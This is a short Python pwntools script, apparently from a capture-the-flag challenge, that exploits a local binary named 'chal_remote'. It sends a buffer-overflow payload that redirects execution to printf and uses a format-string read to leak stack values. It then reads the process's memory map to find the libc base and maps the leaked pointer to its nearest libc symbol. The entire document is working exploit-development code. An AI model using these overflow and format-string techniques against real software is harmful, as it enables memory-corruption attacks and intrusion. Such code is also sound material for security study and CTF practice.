#!/usr/bin/env python3
import os
os.environ["TERM"]="xterm"
from pwn import *
context.log_level="error"
libc = ELF("/work/waf/libc.so.6", checksec=False)
PRINTF=0x4010d4

# Leak %5$p from chal_remote (uses remote libc), and get its libc base from /proc/pid/maps.
p = process("/work/waf/waf/chal_remote")
p.recvuntil(b">> ")
pay = (b"exit" + b"L%5$p" + b".%13$p").ljust(88, b"A") + p64(PRINTF)
p.send(pay)
time.sleep(0.3)
# read libc base from maps
pid = p.pid
maps = open(f"/proc/{pid}/maps").read()
base=None
for line in maps.splitlines():
    if "libc.so.6" in line and "r-xp" in line:
        pass
    if "libc.so.6" in line:
        b=int(line.split("-")[0],16)
        if base is None or b<base: base=b
out = p.recv(timeout=1)
p.close()
print("raw out:", out[:120])
import re
m = re.search(rb"L(0x[0-9a-f]+)\.(0x[0-9a-f]+|\(nil\))", out)
if m and base:
    leak5 = int(m.group(1),16)
    print(f"libc_base = {hex(base)}")
    print(f"%5$p      = {hex(leak5)}")
    off = leak5 - base
    print(f"%5$p offset in remote libc = {hex(off)}")
    # identify nearest symbol
    best=None
    for name,addr in libc.symbols.items():
        if isinstance(addr,int) and addr<=off and addr>0:
            if best is None or addr>best[1]: best=(name,addr)
    if best: print(f"nearest sym: {best[0]}+{hex(off-best[1])}")
